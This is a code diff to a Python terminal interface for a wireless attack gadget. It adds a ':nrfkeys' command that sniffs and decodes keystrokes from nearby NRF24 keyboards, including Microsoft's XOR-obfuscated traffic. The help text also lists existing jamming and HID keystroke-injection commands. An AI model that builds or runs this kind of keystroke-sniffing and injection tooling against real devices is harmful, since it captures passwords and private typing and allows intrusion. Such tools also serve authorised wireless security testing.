@@ -26,6 +26,7 @@ Smart console (single input box):
   :nrfpresets            list the jam presets
   :nrfsweep              sweep-jam NRF channels 1-80
   :nrfhijack <action>[arg][proto] HID inject (calc|cmd|type|run|jam) on selected
+  :nrfkeys [secs]        sniff+decode keystrokes from selected (cleartext+MS-XOR)
 Keys: ctrl+r refresh status · ctrl+l clear log · ctrl+q quit
 """
 import os
@@ -383,6 +384,22 @@ class CompanionTUI(App):
                 self.write_log(f"[yellow]nrf carrier jam[/yellow] ch={d['ch']} {secs}s …")
                 r = await asyncio.to_thread(self.dev.nrf_jam_channel, d["ch"], secs)
                 self.write_log("  " + " ".join(r.lines))
+                return
+            if text.startswith(":nrfkeys"):
+                # :nrfkeys [secs] — sniff+decode keystrokes from the selected NRF device
+                parts = text.split()
+                d = self._require_nrf()
+                if not d:
+                    return
+                secs = int(parts[1]) if len(parts) > 1 else 15
+                self.write_log(f"[yellow]nrf readkeys[/yellow] {d['addr']} ch{d['ch']} {secs}s "
+                               f"[dim](cleartext + MS-XOR)[/dim] …")
+                res = await asyncio.to_thread(self.dev.nrf_readkeys, d["addr"], d["ch"], secs)
+                for ln in res["lines"]:
+                    if ln.startswith("[KEY") or ln.startswith("[ENC") or ln.startswith("[NRF"):
+                        self.write_log("  " + ln)
+                if res["text"]:
+                    self.write_log(f"[green]── typed:[/green] {res['text']!r}")
                 return
             if text.startswith(":nrfhijack"):
                 # :nrfhijack <action> [arg] [proto] — on the selected NRF device
